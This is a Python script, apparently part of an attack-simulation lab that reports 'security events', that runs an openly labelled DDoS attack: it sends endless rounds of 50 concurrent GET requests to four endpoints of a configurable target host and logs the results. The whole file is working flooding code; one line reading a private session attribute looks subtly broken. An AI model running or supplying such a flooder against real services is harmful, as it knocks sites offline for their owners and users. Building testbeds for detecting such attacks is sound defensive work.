import asyncio
import aiohttp
import logging
import os
from datetime import datetime
import sys
sys.path.append('/attack/common')
from event_sender import send_security_event

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TARGET_HOST = os.getenv('TARGET_HOST', 'target_proxy')
TARGET_PORT = os.getenv('TARGET_PORT', '80')
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

ENDPOINTS = ["/", "/monitoring", "/security", "/login"]
CONCURRENT_REQUESTS = 50
REQUEST_TIMEOUT = 5

async def make_request(session, endpoint):
    try:
        async with session.get(f"{TARGET_URL}{endpoint}", timeout=REQUEST_TIMEOUT) as response:
            status = response.status
            logger.info(f"Request to {endpoint}: {status}")
            # Отправляем событие для каждого успешного запроса
            if status < 500:
                send_security_event('DDoS', session._source_traceback[-1][0], 
                                 f"Endpoint: {endpoint}, Status: {status}")
            return status
    except Exception as e:
        logger.error(f"Error making request to {endpoint}: {e}")
        return None

async def ddos_attack():
    async with aiohttp.ClientSession() as session:
        while True:
            start_time = datetime.now()
            tasks = []
            
            for _ in range(CONCURRENT_REQUESTS):
                for endpoint in ENDPOINTS:
                    tasks.append(make_request(session, endpoint))
            
            results = await asyncio.gather(*tasks, return_exceptions=True)
            successful = len([r for r in results if r and r < 500])
            failed = len(results) - successful
            
            duration = (datetime.now() - start_time).total_seconds()
            logger.info(f"Attack round completed in {duration:.2f}s. Successful: {successful}, Failed: {failed}")
            
            await asyncio.sleep(1)

if __name__ == "__main__":
    logger.info("Starting DDoS attack...")
    asyncio.run(ddos_attack()) 